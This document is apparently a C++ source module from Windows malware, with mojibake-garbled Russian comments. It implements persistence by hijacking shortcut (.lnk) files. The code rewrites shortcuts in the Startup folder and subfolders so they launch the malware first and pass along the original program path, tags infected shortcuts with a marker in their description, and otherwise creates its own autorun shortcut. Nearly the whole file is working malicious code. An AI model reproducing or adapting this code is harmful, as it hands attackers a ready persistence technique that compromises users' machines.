#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include "lnk.h"
#include "dprint.h"

#pragma function(memcpy)
LPVOID memcpy(void *dst,const void *src,size_t count)
{
    while (count--)
    {
        *(char *)dst = *(char *)src;
        dst = (char *)dst + 1;
        src = (char *)src + 1;
    }
    return dst;
}

#pragma function(memset)
LPVOID memset(void *dst,int c,size_t count)
{
    for(u_int i=0; i<count; i++)
        ((u_char*)dst)[i] = (u_char)c;

    return dst;
}

// ѕровер€ем наличие маркера в описании €рлыка.
bool IsLnkInfected(TCHAR *lpLink)
{
    bool bRet=false;
    IShellLink *psl=NULL;
    HRESULT hres;
    hres=CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_ALL,IID_IShellLink,(void**)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile *ppf;
        hres=psl->QueryInterface(IID_IPersistFile,(void**)&ppf);
        if (SUCCEEDED(hres))
        {
            hres=ppf->Load(lpLink,0);
            if (SUCCEEDED(hres))
            {
                TCHAR szDescr[260]={0};
                psl->GetDescription(szDescr,sizeof(szDescr)/sizeof(szDescr[0]));
                TCHAR szBytes[]={INFECT_MARKER};
                if (StrStr(szDescr,szBytes))
                    bRet=true;
                ppf->Release();
            }
            psl->Release();
        }
    }
    return bRet;
}

// ¬ описании €рлыка прописываем свой маркер.
void MarkLnkAsInfected(TCHAR *lpLink)
{
    IShellLink *psl=NULL;
    HRESULT hres;
    hres=CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_ALL,IID_IShellLink,(void**)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile *ppf;
        hres=psl->QueryInterface(IID_IPersistFile,(void**)&ppf);
        if (SUCCEEDED(hres))
        {
            hres=ppf->Load(lpLink,0);
            if (SUCCEEDED(hres))
            {
                TCHAR szDescr[260]={0};
                psl->GetDescription(szDescr,sizeof(szDescr)/sizeof(szDescr[0]));
                TCHAR szBytes[]={INFECT_MARKER};
                lstrcat(szDescr,szBytes);
                psl->SetDescription(szDescr);
                ppf->Save(lpLink,FALSE);
                ppf->Release();
            }
            psl->Release();
        }
    }
    return;
}

// «амен€ем файл запуска, при это сохран€€
// путь к оригинальному исполн€емому файлу параметром
// дл€ нового исполн€емого файлы

bool InfectLnk(TCHAR *lpLink,TCHAR *lpExe)
{
    if (IsLnkInfected(lpLink))
        return true;

    bool bRet=false;
    IShellLink *psl=NULL;
    HRESULT hres;
    hres=CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_ALL,IID_IShellLink,(void**)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile *ppf;
        hres=psl->QueryInterface(IID_IPersistFile,(void**)&ppf);

        if (SUCCEEDED(hres))
        {
            hres=ppf->Load(lpLink,0);
            if (SUCCEEDED(hres))
            {
                TCHAR szOldPath[MAX_PATH],
                      szIconPath[MAX_PATH];
                WIN32_FIND_DATA wfd;
                int dwIdx;
                psl->GetPath(szOldPath,MAX_PATH,(WIN32_FIND_DATA*)&wfd,0);
                psl->GetIconLocation(szIconPath,MAX_PATH,&dwIdx);
                if (!*szIconPath)
                    psl->SetIconLocation(szOldPath,0);

                int dwLen=lstrlen(szOldPath);
                TCHAR *p=szOldPath+dwLen;
                for (int i=dwLen; i > 0; i--, p--)
                {
                    if (*p == '.')
                        break;
                }
                if (p != szOldPath)
                {
                    if (!lstrcmpi(p,TEXT(".exe")))
                    {
                        TCHAR szArg[MAX_PATH];
                        wsprintf(szArg,TEXT("\"%s\""),szOldPath);
                        psl->SetPath(lpExe);
                        psl->SetArguments(szArg);
                        ppf->Save(lpLink,FALSE);
                        bRet=true;
                    }
                }
                ppf->Release();
            }
        }
        psl->Release();
        if (bRet)
            MarkLnkAsInfected(lpLink);
    }
    return bRet;
}

// –екурсивно дл€ всех €рлыков в указанной директории проводим
// операцию InfectLnk и накапливаем счетчик получившихс€ €рлыков.
// –апортуем об успехе, если хот€ бы один отрабатывает.

bool InfectDirectory(TCHAR *lpDir,TCHAR *lpExe)
{
    bool bRet=false;
    WIN32_FIND_DATA wfd;
    TCHAR szDir[MAX_PATH];
    wsprintf(szDir,TEXT("%s\\*.*"),lpDir);
    HANDLE hFind=FindFirstFile(szDir,&wfd);
    DWORD dwCount=0;
    do
    {
        if (hFind == INVALID_HANDLE_VALUE) break;
        
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if ((lstrcmp(wfd.cFileName,TEXT("."))) && (lstrcmp(wfd.cFileName,TEXT(".."))))
            {
                TCHAR szNewDir[MAX_PATH];
                wsprintf(szNewDir,TEXT("%s\\%s"),lpDir,wfd.cFileName);
                dwCount+=(DWORD)InfectDirectory(szNewDir,lpExe);
            }
        }
        else
        {
            int dwLen=lstrlen(wfd.cFileName);
            TCHAR *p=wfd.cFileName+dwLen;
            for (int i=dwLen; i > 0; i--, p--)
            {
                if (*p == '.')
                    break;
            }
            if (p != wfd.cFileName)
            {
                if (!lstrcmpi(p,TEXT(".lnk")))
                {
                    TCHAR szFileName[MAX_PATH];
                    wsprintf(szFileName,TEXT("%s\\%s"),lpDir,wfd.cFileName);
                    dwCount+=(DWORD)InfectLnk(szFileName,lpExe);
                }
            }
        }
    }
    while (FindNextFile(hFind,&wfd));

    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);

    if (dwCount)
        bRet=true;
    return bRet;
}

static TCHAR szArunPath[MAX_PATH];

// ѕровер€ем совпадаем ли путь в €рлыке с заданным в параметре.
bool CheckLnk(TCHAR *lpLnk,TCHAR *lpExeFile)
{
    bool bRet=false;
    IShellLink *psl=NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(void**)&psl)))
    {
        IPersistFile *ppf=NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile,(void**)&ppf)))
        {
            if (SUCCEEDED(ppf->Load(lpLnk,STGM_READ)))
            {
                TCHAR szPath[MAX_PATH];
                WIN32_FIND_DATA wfd;
                if (SUCCEEDED(psl->GetPath(szPath,MAX_PATH,&wfd,SLGP_RAWPATH)))
                {
                    if (!lstrcmpi(lpExeFile,szPath))
                        bRet=true;
                }
            }
            ppf->Release();
        }
    }
    psl->Release();
    return bRet;
}

// ѕровер€ем €рлыки в папке јвтозапуска на то, чтобы
// в них был указанныей в параметрах €рлык был уже обработан и
// путь в €рлыках указывал на указанный в параметрах.

bool IsItArun(TCHAR *lpLnkFile)
{
    bool bRet=false;
    WIN32_FIND_DATA wfd;
    TCHAR szDir[MAX_PATH];
    wsprintf(szDir,TEXT("%s\\*.lnk"),szArunPath);

    PP_DPRINTF(L"IsItArun: Step1");

    HANDLE hFind=FindFirstFile(szDir,&wfd);
    do
    {
        if (hFind == INVALID_HANDLE_VALUE) break;

        TCHAR szFileName[MAX_PATH];
        wsprintf(szFileName,TEXT("%s\\%s"),szArunPath,wfd.cFileName);
        PP_DPRINTF(L"IsItArun: Step2");

        if ((IsLnkInfected(lpLnkFile)) && (CheckLnk(szFileName,lpLnkFile)))
        {
            PP_DPRINTF(L"IsItArun: Step3");
            bRet=true;
            break;
        }
    }
    while (FindNextFile(hFind,&wfd));
    PP_DPRINTF(L"IsItArun: Step4");
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    PP_DPRINTF(L"IsItArun: Step5");
    return bRet;
}

// —оздаетс€ €рлык в папке автозапуска на указанный в
// параметрах путь.
void MakeMeArun(TCHAR *lpExe)
{
    TCHAR szLnk[MAX_PATH];
    SHGetSpecialFolderPath(NULL,szArunPath,CSIDL_STARTUP,false);

    if (!IsItArun(lpExe))
    {
        bool bDone=false;
        IShellLink *psl=NULL;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(void**)&psl)))
        {
            int dwLen=lstrlen(lpExe);
            TCHAR szFileName[MAX_PATH],szPath[MAX_PATH]={0},*p=lpExe+dwLen;
            for (int i=dwLen; i > 0; i++, p--)
            {
                if (*(p-1) == '\\')
                    break;
            }
            for (int i=dwLen; i > 0; i--)
            {
                if (lpExe[i] == '.')
                {
                    lpExe[i]=0;
                    break;
                }
            }

            lstrcpy(szFileName,p);
            dwLen=(p-lpExe)*sizeof(TCHAR);
            memcpy(szPath,lpExe,dwLen);

            wsprintf(szLnk,TEXT("%s\\%s.lnk"),szArunPath,szFileName);

            psl->SetPath(lpExe);
            psl->SetWorkingDirectory(szPath);

            IPersistFile *ppf=NULL;
            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile,(void**)&ppf)))
            {
                ppf->Save(szLnk,true);
                ppf->Release();
                bDone=true;
            }
            psl->Release();
        }
        if (bDone)
            MarkLnkAsInfected(szLnk);
    }
    return;
}


void AddSelfBodyToAutorunAsLink()
{
  /// ѕолучаем путь к папке автостарта.
  /// »змен€ет все €рлыки там собой с сохранением оригинального пути,
  /// что запустить оригинальную программу после своего старта.
  /// ≈сли этого сделать не получаетс€ - просто создаетс€
  /// €рлык на себ€.
  TCHAR self_path[MAX_PATH];
  PIDLIST_ABSOLUTE id_list;
  TCHAR startup_dir_path[MAX_PATH];

  CoInitialize(NULL);

  GetModuleFileName(0,self_path,MAX_PATH);
  SHGetSpecialFolderLocation(0,CSIDL_STARTUP,&id_list);
  SHGetPathFromIDList(id_list,startup_dir_path);  

  if (!InfectDirectory(startup_dir_path,self_path))
  {    
    MakeMeArun(self_path);
  }
  
  CoUninitialize();  
}
